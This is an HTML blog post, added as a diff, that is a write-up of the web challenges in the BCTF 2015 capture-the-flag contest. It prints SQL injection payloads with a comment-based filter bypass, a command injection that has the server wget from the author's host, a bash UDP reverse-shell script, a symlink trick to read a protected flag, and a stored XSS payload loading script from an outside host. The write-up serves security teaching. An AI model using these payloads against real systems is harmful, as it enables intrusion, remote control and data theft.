@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>BCTF 2015 WEB Writeup - Linux.im</title>
+    <meta name="description" content="Hacking for fun. - evi1m0"/>
+    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <style>
+      h1 {
+        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
+      }
+    </style>
+    <div class="site">
+      <div class="post-content" style="margin-top: -20px;">
+        <div id="post">
+          <h1 id="bctf-2015-web-writeup">BCTF 2015 WEB Writeup</h1>
+<p class="date">23 Mar 2015 - evi1m0</p>
+
+<h4 id="checkin-10">Checkin 10</h4>
+
+<p>Desc: Please checkin at IRC</p>
+
+<ul>
+  <li>IRC: <a href="http://webchat.freenode.net/">http://webchat.freenode.net/</a></li>
+  <li>Channels: bctf</li>
+</ul>
+
+<p>Bulletin board:</p>
+
+<pre><code>[BCTF 2015 has started. Check in flag: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx}. 
+</code></pre>
+
+<p>Rot13 decode:</p>
+
+<pre><code>OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx} &lt;--&gt; BCTF{we1c0me-t0-BCTF-2015_g00d-luck}
+</code></pre>
+
+<hr />
+
+<h4 id="sqlienginescore-200">Sqli_engineScore 200</h4>
+
+<p><img src="http://ww2.sinaimg.cn/large/c334041bgw1eqehdrsxq4j20j40cndgr.jpg" alt="http://ww2.sinaimg.cn/large/c334041bgw1eqehdrsxq4j20j40cndgr.jpg" /></p>
+
+<p>Desc: </p>
+
+<blockquote>
+  <p>http://104.197.7.111:8080/</p>
+
+  <p>geohot told me he has a lot of sql injection tricks. So I wrote a sql injection detection engine in defense.</p>
+
+  <p>Now you have a simple website protected by my engine, try to steal the admin’s password(not hash).</p>
+</blockquote>
+
+<p>Username, Password ::: SQLi</p>
+
+<pre><code>  &lt;form id="submit-form" class="form-group" action="/register" method="POST"&gt;
+    &lt;input type="text" placeholder="username" class="form-control" name="username"/&gt;
+    &lt;input type="password" placeholder="password" class="form-control" name="password"/&gt;
+    &lt;span class="input-icon fui-check-inverted"&gt;&lt;/span&gt;
+    &lt;br /&gt;
+    &lt;div class="row"&gt;
+      &lt;div class="col-xs-3"&gt; &lt;button type="submit" class="btn btn-block btn-lg btn-primary"&gt;Register&lt;/button&gt; &lt;/div&gt;
+      Already registered?&lt;a href="/static/login.html"&gt;Click Here to Login&lt;/a&gt;
+    &lt;/div&gt;
+    &lt;br /&gt;
+  &lt;/form&gt;
+</code></pre>
+
+<p>SQL Injection:</p>
+
+<pre><code>URL: http://104.197.7.111:8080/register
+POST: username=admin&amp;password=,'
+
+error executing sql: insert into users (username, password) values ('admin', ','')
+
+(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '','')' at line 1")
+</code></pre>
+
+<p>Continue:</p>
+
+<pre><code>username=admin\&amp;password=,updatexml(1,(select password from users limit 1),1) or '
+
+password contains SQL injection, IP recorded.
+</code></pre>
+
+<p>Bypass WAF:</p>
+
+<pre><code>username=admin\&amp;password=,updatexml(1,(/*/*/select password from/*/*/users limit/*/*/1),1) or/*/*/'
+
+(1105, "XPATH syntax error: '{h0w-d1d-y0u-fee1-l1ke-th3-sql1-'")
+</code></pre>
+
+<p>Substring right:</p>
+
+<pre><code>username=admin\&amp;password=,updatexml(1,(/*/*/select right(password,33)/*/*/from/*/*/users limit/*/*/1),1) or/*/*/'
+
+(1105, "XPATH syntax error: 'd-y0u-fee1-l1ke-th3-sql1-eng1ne}'")
+</code></pre>
+
+<p>String concatenation (FLAG):</p>
+
+<pre><code>{h0w-d1d-y0u-fee1-l1ke-th3-sql1-eng1ne}
+</code></pre>
+
+<hr />
+
+<h4 id="torrentloverscore-233">Torrent_loverScore 233</h4>
+
+<p>Desc: A dog loves torrent.</p>
+
+<p><img src="http://ww1.sinaimg.cn/large/c334041bgw1eqegar7st4j20ac03sdfz.jpg" alt="http://ww1.sinaimg.cn/large/c334041bgw1eqegar7st4j20ac03sdfz.jpg" /></p>
+
+<p><img src="http://ww3.sinaimg.cn/large/c334041bgw1eqegb9eahij20a502gq2y.jpg" alt="http://ww3.sinaimg.cn/large/c334041bgw1eqegb9eahij20a502gq2y.jpg" /></p>
+
+<p>http://218.2.197.253/zhongzi/index.php:</p>
+
+<p><img src="http://ww3.sinaimg.cn/large/c334041bgw1eqegc3043aj20ex0b13zl.jpg" alt="http://ww3.sinaimg.cn/large/c334041bgw1eqegc3043aj20ex0b13zl.jpg" /></p>
+
+<p>We guess, Maybe the command execution, The program calls the system function? Because we have no other way. :-(</p>
+
+<p>Testing:</p>
+
+<pre><code>http://www.google.com/`wget worm.cc:8000`/1.torrent
+http://www.google.com/`wget${IFS}worm.cc:8000`/1.torrent
+</code></pre>
+
+<p>We have received req (404):</p>
+
+<pre><code>root@e:/rootkit# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+118.186.202.142 - - [22/Mar/2015 13:44:39] "GET / HTTP/1.1" 200 -
+118.186.202.142 - - [22/Mar/2015 13:44:41] code 404, message File not found
+</code></pre>
+
+<p>ubd.sh:</p>
+
+<pre><code>#!/bin/bash
+
+exec 9&lt;&gt; /dev/udp/localhost/8088
+[ $? -eq 1 ] &amp;&amp; exit
+echo "connect ok" &gt;&amp;9
+
+while :
+do
+  a=`dd bs=200 count=1 &lt;&amp;9 2&gt;/dev/null`
+  if echo "$a"|grep "exit"; then break; fi
+  echo `$a` &gt;&amp;9
+done
+
+exec 9&gt;&amp;-
+exec 9&lt;&amp;-
+</code></pre>
+
+<p>nc -lu 8088</p>
+
+<p><img src="http://ww3.sinaimg.cn/large/c334041bgw1eqegkzopavj20s9083acl.jpg" alt="http://ww3.sinaimg.cn/large/c334041bgw1eqegkzopavj20s9083acl.jpg" /></p>
+
+<p>find use_me_to_read_flag and flag:</p>
+
+<pre><code>/var/www/flag/use_me_to_read_flag /var/www/flag/flag
+&gt;_ Permission denied
+</code></pre>
+
+<p>IDA, see _strstr “flag”:</p>
+
+<p><img src="http://ww2.sinaimg.cn/large/c334041bgw1eqeguifv68j20vw0br76y.jpg" alt="http://ww2.sinaimg.cn/large/c334041bgw1eqeguifv68j20vw0br76y.jpg" /></p>
+
+<p>Cat FLAG:</p>
+
+<pre><code>ln -s /var/www/flag/flag /tmp/warning
+/var/www/flag/use_me_to_read_flag /tmp/warning
+</code></pre>
+
+<p><img src="http://ww1.sinaimg.cn/large/c334041bgw1eqegx2zctxj20fm03zjro.jpg" alt="http://ww1.sinaimg.cn/large/c334041bgw1eqegx2zctxj20fm03zjro.jpg" /></p>
+
+<hr />
+
+<h4 id="webchat-325">Webchat 325</h4>
+
+<p>Desc: http://146.148.60.107:9991/</p>
+
+<p><img src="http://ww2.sinaimg.cn/large/c334041bgw1eqeh1ri1hwj20ka0co3zm.jpg" alt="http://ww2.sinaimg.cn/large/c334041bgw1eqeh1ri1hwj20ka0co3zm.jpg" /></p>
+
+<p>Websocket XSS? SQL Injection?</p>
+
+<p>View-source:</p>
+
+<pre><code>&lt;script&gt;
+    $(document).ready(
+    function() {
+        function connect() {
+            $("#status").text("Connecting");
+            $("#status").attr("class", "text-primary");
+            var ws = new window.WebSocket('ws://' + location.host + '/ws');
+            ws.onopen = function() { $("#status").attr('class', 'text-success').text('Connected'); 
+                $("#submit_btn").attr('disabled', false).click(function() {
+                    $("#sendstatus").attr('class', 'text-primary').text('Sending...');
+                    ws.send($("#i_nick").val() + ": " + $("#i_msg").val());
+                });
+            }
+            ws.onclose = function() { $("#status").attr('class', 'text-danger').text('Disconnected'); setTimeout(connect, 5000);}
+            ws.onerror = function() { $("#status").attr('class', 'text-danger').text('Failed to connect.'); }
+            ws.onmessage = function(datad) {
+                var data = datad.data;
+                if (data[0] == 'm') $("#msg").html(data.substr(1) + "&lt;br/&gt;" +  $("#msg").html());
+                if (data[0] == 's') { $("#i_msg").val(''); $("#sendstatus").attr('class', 'text-success').text('Message Sent');}
+                if (data[0] == 'e') { $("#i_msg").val(''); $("#sendstatus").attr('class', 'text-danger').text('Message Rejected');}
+            }
+        }
+        connect();
+    });
+&lt;/script&gt;
+</code></pre>
+
+<ul>
+  <li>http://ironwasp.org/cswsh.html</li>
+  <li>ws://146.148.60.107:9991/ws</li>
+</ul>
+
+<p><img src="http://ww1.sinaimg.cn/large/c334041bgw1eqeh4j4q9ej20qu0dmmy6.jpg" alt="http://ww1.sinaimg.cn/large/c334041bgw1eqeh4j4q9ej20qu0dmmy6.jpg" /></p>
+
+<pre><code>mysql&gt; select hex('&lt;script src=http://xss.net/0TLs5n?1426923466&gt;&lt;/script&gt;');
++--------------------------------------------------------------+
+| hex('&lt;script src=http://xss.net/0TLs5n?1426923466&gt;&lt;/script&gt;')                                                         	|
++--------------------------------------------------------------+
+| 	
+3C73637269707***********3D687474703A2F2F7873732E6861636B7461736B2E6E65742F30544C73356E3F
+|
++--------------------------------------------------------------+
+
+
+test: '),(0x3C73637269707***********3D687474703A2F2F7873732E6861636B7461736B2E6E65742F30544C73356E3F),('
+</code></pre>
+
+<p><img src="http://ww2.sinaimg.cn/large/c334041bgw1eqehatp9ujj209106t3yz.jpg" alt="http://ww2.sinaimg.cn/large/c334041bgw1eqehatp9ujj209106t3yz.jpg" /></p>
+
+<p><a href="http://146.148.60.107:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&amp;id=24">http://146.148.60.107:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&amp;id=24</a></p>
+
+<p>Page Content: Only admin in local network with correct password can review chat logs. But you’ve already had the flag you want,right?</p>
+
+<pre><code>➜  ~  echo -n "QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==" | base64 -D
+BCTF{xss_is_not_that_difficult_right}
+</code></pre>
+
+        </div>
+      </div>
+
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_shortname = 'evi1m0';
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
